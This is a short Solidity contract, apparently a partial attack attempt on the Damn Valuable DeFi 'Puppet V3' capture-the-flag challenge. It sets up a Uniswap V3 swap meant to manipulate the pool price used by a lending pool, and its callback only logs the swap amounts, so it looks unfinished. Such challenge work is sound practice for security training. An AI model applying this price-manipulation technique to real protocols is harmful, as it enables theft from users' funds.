pragma solidity ^0.8.0;

import "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "../DamnValuableToken.sol";

import "hardhat/console.sol";


contract AttackPuppetV3 is IUniswapV3SwapCallback {
  DamnValuableToken public dvt;
  address public weth;
  address public lendingPool;
  IUniswapV3Pool public liquidityPool;


  constructor (
    address _dvt,
    address _weth,
    address _lendingPool,
    address _liquidityPool
  ) {
    dvt = DamnValuableToken(_dvt);
    weth = _weth;
    lendingPool = _lendingPool;
    liquidityPool = IUniswapV3Pool(_liquidityPool);

    dvt.approve(address(liquidityPool), 10000 ether);
  } 

  function performSwap() external {
    liquidityPool.swap(
      address(this),
      false,
      100 ether,
      0,
      ""
      );
  }

  function uniswapV3SwapCallback(
    int256 amount0Delta,
    int256 amount1Delta,
    bytes memory data
  ) external {
    console.logInt(amount0Delta);
    console.logInt(amount1Delta);
  }
}